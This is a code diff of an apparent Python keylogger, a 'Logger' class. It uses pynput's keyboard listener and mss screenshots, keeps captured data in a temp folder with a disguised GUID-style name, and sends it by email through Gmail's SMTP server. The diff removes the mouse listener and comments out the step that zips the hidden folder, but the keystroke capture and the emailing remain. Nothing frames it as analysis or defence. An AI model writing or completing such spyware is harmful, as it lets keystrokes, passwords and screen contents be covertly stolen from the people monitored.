@@ -1,9 +1,5 @@
 # Third Party Modules
-import shutil
-import zlib
-
 from pynput.keyboard import Listener as k_Listener
-from pynput.mouse import Listener as m_Listener
 import mss.tools
 
 # TODO Replace this with a cross platform lib
@@ -205,7 +201,6 @@ class Logger:
 
             if elapsed_time > seconds:
                 print("Event finished")
-                dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
                 break
 
     def send_email(self):
@@ -216,10 +211,10 @@ class Logger:
 
         # TODO Add Mimes
 
-        dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
-        if os.path.exists(dirname):
-            archive_name = dirname + self.user
-            shutil.make_archive(archive_name, 'zip', dirname)
+        # dirname = os.environ["temp"] + "\\EFA5SDB1-294Z-4501-A50A-EE19323E85A5"
+        # if os.path.exists(dirname):
+        #     archive_name = dirname + self.user
+        #     shutil.make_archive(archive_name, 'zip', dirname)
 
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
